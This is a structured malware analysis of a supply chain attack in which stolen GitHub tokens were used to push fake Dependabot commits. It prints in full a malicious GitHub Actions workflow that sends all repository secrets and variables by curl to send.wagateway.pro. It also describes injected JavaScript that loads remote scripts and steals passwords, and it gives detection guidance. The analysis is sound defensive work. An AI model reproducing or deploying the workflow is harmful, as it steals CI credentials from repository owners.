package_info.package_name: N/A (malicious commit via compromised GitHub token, not a package)
package_info.package_versions: N/A (affects all commits made by attacker)
package_info.why_malicious: The attack involves unauthorized commits to hundreds of repositories using stolen GitHub personal access tokens, adding malicious GitHub Actions and modifying JavaScript files to exfiltrate secrets and user credentials. The attacker impersonates Dependabot to evade detection, resulting in widespread supply chain compromise.

malicious_snippets.code_snippet:
name: hook
on: [push]
jobs:
  env:
    runs-on: ubuntu-latest
    steps:
      - name: Run
        env:
          MY_ENV: ${{ toJSON(secrets) }}
          MY_VARS: ${{ toJSON(vars) }}
        run: |
          echo $MY_ENV | curl 'https://send.wagateway.pro/webhook' -H 'Content-Type: application/json' -d @-
          echo $MY_VARS | curl 'https://send.wagateway.pro/webhook' -H 'Content-Type: application/json' -d @-
malicious_snippets.code_behavior: On every push event, the workflow serializes all GitHub repository secrets and variables, then exfiltrates them via HTTPS POST to a hardcoded C2 domain, enabling secret theft.

malice_analysis.why_suspicious: Exfiltrating all repository secrets and variables to an external server is a clear sign of credential theft.
malice_analysis.violated_expectations: Normal GitHub Actions should not send secrets to untrusted external domains; this is a direct violation of CI/CD security best practices.
malice_analysis.similar_legitimate_use: Legitimate workflows may send build artifacts to trusted internal endpoints, but never secrets to unknown domains.
key_indicators: Use of toJSON(secrets) and toJSON(vars) to collect all secrets/variables
curl POST to external, non-corporate domain

execution_context.trigger: runtime (browser execution of modified JS files)

malicious_snippets.code_behavior: At runtime in the browser, the code appends a script tag to load a remote JavaScript file from a malicious domain, enabling further credential-stealing payloads.

malice_analysis.why_suspicious: Appending obfuscated code to all JS files that loads a remote script from an untrusted domain is a classic web supply chain attack.
malice_analysis.violated_expectations: Legitimate code should not inject remote scripts from unknown domains into production JS files.
malice_analysis.similar_legitimate_use: Dynamic script loading is used for analytics or feature toggles, but only from trusted, whitelisted domains.
key_indicators: Obfuscated code appended to all JS files
No user consent or documentation for this behavior

malicious_snippets.code_behavior: At runtime in the browser, the code hooks all password form submissions, intercepts credentials, and exfiltrates them to the attacker's server before allowing the form to submit.

malice_analysis.why_suspicious: Intercepting password form submissions and sending credentials to an external server is a textbook credential-stealing technique.
malice_analysis.violated_expectations: Legitimate scripts should never exfiltrate user credentials; form handlers should only process data locally or send to trusted backends.
malice_analysis.similar_legitimate_use: Form validation or analytics may hook form submissions, but never exfiltrate passwords.
key_indicators: Sends serialized form data to external domain
Runs in context of user-facing web applications

attack_chain.action: Attacker obtains victim's GitHub personal access token, likely via a malicious package or local compromise.
attack_chain.leads_to: Allows attacker to authenticate as victim and push code to repositories.

attack_chain.action: Attacker uses stolen token to push fake Dependabot commits to public and private repositories, adding malicious GitHub Actions and modifying JS files.
attack_chain.leads_to: Malicious code is now present in CI/CD workflows and web application code.

attack_chain.action: On every push, the malicious GitHub Action exfiltrates repository secrets and variables to the attacker's server.
attack_chain.leads_to: Attacker gains access to sensitive secrets and environment variables.

attack_chain.action: When end-users load the compromised web application, the modified JS files load a remote script that intercepts password form submissions and exfiltrates credentials.
attack_chain.leads_to: Attacker receives user credentials from all affected web applications.

behavioral_signatures: New or modified GitHub Actions that POST secrets/variables to external domains
Obfuscated code appended to all *.js files that loads remote scripts
JavaScript code that hooks password form submissions and sends data externally
Commits attributed to Dependabot with unusual or undocumented changes
file_indicators: Any new or modified workflow file with curl POST to non-corporate domains
JS files with appended obfuscated code referencing send.wagateway.pro
detection_knowledge.how_to_detect: Monitor for new or modified GitHub Actions that access secrets and POST to external domains. Scan repository JS files for appended obfuscated code that loads remote scripts. Alert on any workflow or code referencing send.wagateway.pro. Review commit histories for suspicious activity attributed to Dependabot, especially with undocumented or obfuscated changes. Monitor outgoing network traffic from CI/CD runners and web applications for connections to known malicious domains.
